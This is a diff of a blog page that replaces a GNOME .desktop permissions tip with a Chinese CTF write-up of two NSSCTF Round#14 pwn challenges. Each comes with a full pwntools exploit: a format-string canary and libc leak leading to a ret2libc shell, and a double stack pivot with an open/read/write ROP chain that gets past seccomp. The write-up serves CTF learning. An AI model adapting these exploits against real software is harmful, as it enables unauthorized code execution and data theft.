@@ -16,21 +16,26 @@
   <meta name="author" content="OSLike">
   <meta name="keywords" content="">
   
-    <meta name="description" content="分别在和&#x2F;Desktop下ls -l查看权限，用户组和用户都是本机并且需要.desktop以及Desktop均为权限744即rwxr--r--">
+    <meta name="description" content="love看一眼就是非栈上格式化字符串加上栈溢出，修改v4等于v5，然后记录libc_base和canary，新线程获得canary的方法是和主线程的canary相同。 但是估计猜测原本是想搞TLS结构体，泄露canary可能是非预期解。目前本人还不会TLS求canary的做法，先给出一份利用格式化字符串漏洞泄露canary的做法。 然后额外先输入一次%p.%p.%p.%p.%p.%p.%p.%p.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="GNOME下桌面.desktop文件（快捷方式）无允许执行解决办法">
-<meta property="og:url" content="http://example.com/2023/07/03/GNOME%E4%B8%8B%E6%A1%8C%E9%9D%A2.desktop%E6%96%87%E4%BB%B6%EF%BC%88%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%EF%BC%89%E6%97%A0%E5%85%81%E8%AE%B8%E6%89%A7%E8%A1%8C%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/index.html">
+<meta property="og:title" content="NSSCTF Round#14 Pwn方向专项赛WP">
+<meta property="og:url" content="http://example.com/2023/07/30/NSSCTF-Round-14-Pwn%E6%96%B9%E5%90%91%E4%B8%93%E9%A1%B9%E8%B5%9BWP/index.html">
 <meta property="og:site_name" content="OSLike&#39;s Blog">
-<meta property="og:description" content="分别在和&#x2F;Desktop下ls -l查看权限，用户组和用户都是本机并且需要.desktop以及Desktop均为权限744即rwxr--r--">
+<meta property="og:description" content="love看一眼就是非栈上格式化字符串加上栈溢出，修改v4等于v5，然后记录libc_base和canary，新线程获得canary的方法是和主线程的canary相同。 但是估计猜测原本是想搞TLS结构体，泄露canary可能是非预期解。目前本人还不会TLS求canary的做法，先给出一份利用格式化字符串漏洞泄露canary的做法。 然后额外先输入一次%p.%p.%p.%p.%p.%p.%p.%p.">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-07-03T06:33:49.000Z">
-<meta property="article:modified_time" content="2023-07-03T06:37:41.953Z">
+<meta property="og:image" content="https://tse2-mm.cn.bing.net/th/id/OIP-C.MK07uhqHDG1v8ejCmu2uCQHaG1?pid=ImgDet&rs=1">
+<meta property="article:published_time" content="2023-07-30T10:09:02.000Z">
+<meta property="article:modified_time" content="2023-07-31T08:54:08.978Z">
 <meta property="article:author" content="OSLike">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://tse2-mm.cn.bing.net/th/id/OIP-C.MK07uhqHDG1v8ejCmu2uCQHaG1?pid=ImgDet&rs=1">
   
   
   
-  <title>GNOME下桌面.desktop文件（快捷方式）无允许执行解决办法 - OSLike&#39;s Blog</title>
+  <title>NSSCTF Round#14 Pwn方向专项赛WP - OSLike&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -218,13 +223,13 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+     style="background: url('https://tse3-mm.cn.bing.net/th/id/OIP-C.0BoehlU0zn2et6YATPgyaQHaE7?pid=ImgDet&rs=1') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="GNOME下桌面.desktop文件（快捷方式）无允许执行解决办法"></span>
+            <span id="subtitle" data-typed-text="NSSCTF Round#14 Pwn方向专项赛WP"></span>
           
         </div>
 
@@ -240,8 +245,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-07-03 14:33" pubdate>
-          2023年7月3日 下午
+        <time datetime="2023-07-30 18:09" pubdate>
+          2023年7月30日 晚上
         </time>
       </span>
     
@@ -252,7 +257,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          75 字
+          2.7k 字
         
       </span>
     
@@ -263,7 +268,7 @@
         
         
         
-          1 分钟
+          20 分钟
         
       </span>
     
@@ -319,12 +324,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">GNOME下桌面.desktop文件（快捷方式）无允许执行解决办法</h1>
+            <h1 style="display: none">NSSCTF Round#14 Pwn方向专项赛WP</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2023年7月3日 下午
+                    本文最后更新于：2023年7月31日 下午
                   
                 
               </p>
@@ -332,8 +337,17 @@
             
               <div class="markdown-body">
                 
-                <p>分别在<del>和</del>&#x2F;Desktop下<code>ls -l</code>查看权限，用户组和用户都是本机并且需要.desktop以及Desktop均为权限744即<code>rwxr--r--</code></p>
+                <h2 id="love"><a href="#love" class="headerlink" title="love"></a>love</h2><p>看一眼就是非栈上格式化字符串加上栈溢出，修改<code>v4</code>等于<code>v5</code>，然后记录<code>libc_base</code>和<code>canary</code>，新线程获得<code>canary</code>的方法是和主线程的<code>canary</code>相同。</p>
+<p>但是估计猜测原本是想搞TLS结构体，泄露canary可能是非预期解。目前本人还不会TLS求canary的做法，先给出一份利用格式化字符串漏洞泄露canary的做法。</p>
+<p>然后额外先输入一次<code>%p.%p.%p.%p.%p.%p.%p.%p.%p</code>测一下偏移长度，由于<code>v4</code>和<code>v5</code>分别在第一和第二个位置，在输出中可以得到分别在第八和第九个位置。接下来就是<code>canary</code>和<code>__libc_start_main</code>，通过调试与观察，相对位置分别在15和17位。</p>
+<p>那么本题其实就没有什么难点了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>io = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>elf = ELF(<span class="hljs-string">&#x27;./p&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>, <span class="hljs-literal">False</span>)<br>ret = <span class="hljs-number">0x4013f3</span><br>rdi = <span class="hljs-number">0x4013f4</span><br>io.sendline(<span class="hljs-string">b&#x27;%8c%9$hhn %15$p %17$p&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>lsm = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><span class="hljs-comment">#libc = LibcSearcher(&#x27;__libc_start_main&#x27;, lsm)</span><br><span class="hljs-comment">#base = lsm - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="hljs-comment">#bsh = base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="hljs-comment">#sys = base + libc.dump(&#x27;system&#x27;)</span><br>base = lsm - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>sys = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bsh = base + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br>io.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(canary)+p64(<span class="hljs-number">0</span>)+p64(ret)+p64(rdi)+p64(bsh)+p64(sys))<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
+<h2 id="rbp"><a href="#rbp" class="headerlink" title="rbp"></a>rbp</h2><p><code>init</code>中返回到了<code>sandbox()</code>，利用<code>seccomp-tools</code>检测dump出来了ban掉小于<code>0x40000000</code>的地址，ban掉非<code>x86_64</code>架构，<code>execve</code>没了，肯定是orw了。</p>
+<p><code>vuln</code>中要输入0x220字节，函数栈中<code>buf+v2</code>一共0x210字节，刚好rbp+ret一共0x10，也有leave ret，肯定栈迁移。然后用vmmap看一下权限，往<code> 0x404000           0x405000 rw-p     1000   3000 /some/place/rbp</code>的bss段写刚好，但是发现没有执行权限，不能写shellcode，所以只能是ROP链，但可执行程序文件本身并没有可用寄存器，那么我们就应该选择提供的libc文件中的寄存器操作。但由于最开始不知道基址，所以需要两次栈迁移，第一次用来泄露<code>libc_base</code>，第二次完成orw。</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>elf = ELF(<span class="hljs-string">&#x27;./rbp&#x27;</span>, <span class="hljs-literal">False</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>, <span class="hljs-literal">False</span>)<br>vuln = <span class="hljs-number">0x401270</span><br>leave = <span class="hljs-number">0x4012BF</span><br>rdi = <span class="hljs-number">0x401353</span><br>rbp = <span class="hljs-number">0x4012EE</span><br>io.sendafter(<span class="hljs-string">b&#x27;it&#x27;</span>, p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>+p64(<span class="hljs-number">0x404500</span>)+p64(vuln))<br>payload = p64(rdi)+p64(elf.got.read)+p64(elf.plt.puts)+p64(rbp)+p64(<span class="hljs-number">0x404500</span>)+p64(vuln)<br>payload = payload.ljust(<span class="hljs-number">0x210</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(<span class="hljs-number">0x4042e8</span>)+p64(leave)<br><span class="hljs-comment"># 0x500 - 0x220 + 0x8 = 0x2e8</span><br>io.sendafter(<span class="hljs-string">b&#x27;it&#x27;</span>, payload)<br>addr = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>base = addr - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>op = base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>re = base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>wr = base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rax = base + <span class="hljs-number">0x36174</span><br>rdi = base + <span class="hljs-number">0x23b6a</span><br>rsi = base + <span class="hljs-number">0x2601f</span><br>rdx = base + <span class="hljs-number">0x142c92</span><br>syscall = base + <span class="hljs-number">0x630a9</span><br>payload = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>payload += p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rdx)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">2</span>)+p64(rdi)+p64(<span class="hljs-number">0x4042f0</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br>payload += p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(<span class="hljs-number">0x404600</span>)+p64(rdx)+p64(<span class="hljs-number">0x100</span>)+p64(re)<br>payload += p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(<span class="hljs-number">0x404600</span>)+p64(rdx)+p64(<span class="hljs-number">0x100</span>)+p64(wr)<br>payload = payload.ljust(<span class="hljs-number">0x210</span>) + p64(<span class="hljs-number">0x4042f0</span>) + p64(leave)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="后面的题还等待后续复现"><a href="#后面的题还等待后续复现" class="headerlink" title="后面的题还等待后续复现"></a>后面的题还等待后续复现</h2>
                 
               </div>
             
@@ -341,6 +355,38 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTFPWN/" class="category-chain-item">CTFPWN</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pwn/">#pwn</a>
+      
+        <a href="/tags/CTF/">#CTF</a>
+      
+        <a href="/tags/wp/">#wp</a>
+      
+    </div>
   
 </div>
 
@@ -350,8 +396,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>GNOME下桌面.desktop文件（快捷方式）无允许执行解决办法</div>
-      <div>http://example.com/2023/07/03/GNOME下桌面.desktop文件（快捷方式）无允许执行解决办法/</div>
+      <div>NSSCTF Round#14 Pwn方向专项赛WP</div>
+      <div>http://example.com/2023/07/30/NSSCTF-Round-14-Pwn方向专项赛WP/</div>
     </div>
     <div class="license-meta">
       
@@ -363,7 +409,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年7月3日</div>
+          <div>2023年7月30日</div>
         </div>
       
       
@@ -395,18 +441,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/07/30/NSSCTF-Round-14-Pwn%E6%96%B9%E5%90%91%E4%B8%93%E9%A1%B9%E8%B5%9BWP/" title="NSSCTF Round#14 Pwn方向专项赛WP">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">NSSCTF Round#14 Pwn方向专项赛WP</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/05/28/Arch-Linux-DDE/" title="Arch-Linux-DDE">
-                        <span class="hidden-mobile">Arch-Linux-DDE</span>
+                      <a href="/2023/07/03/GNOME%E4%B8%8B%E6%A1%8C%E9%9D%A2.desktop%E6%96%87%E4%BB%B6%EF%BC%88%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%EF%BC%89%E6%97%A0%E5%85%81%E8%AE%B8%E6%89%A7%E8%A1%8C%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/" title="GNOME下桌面.desktop文件（快捷方式）无允许执行解决办法">
+                        <span class="hidden-mobile">GNOME下桌面.desktop文件（快捷方式）无允许执行解决办法</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
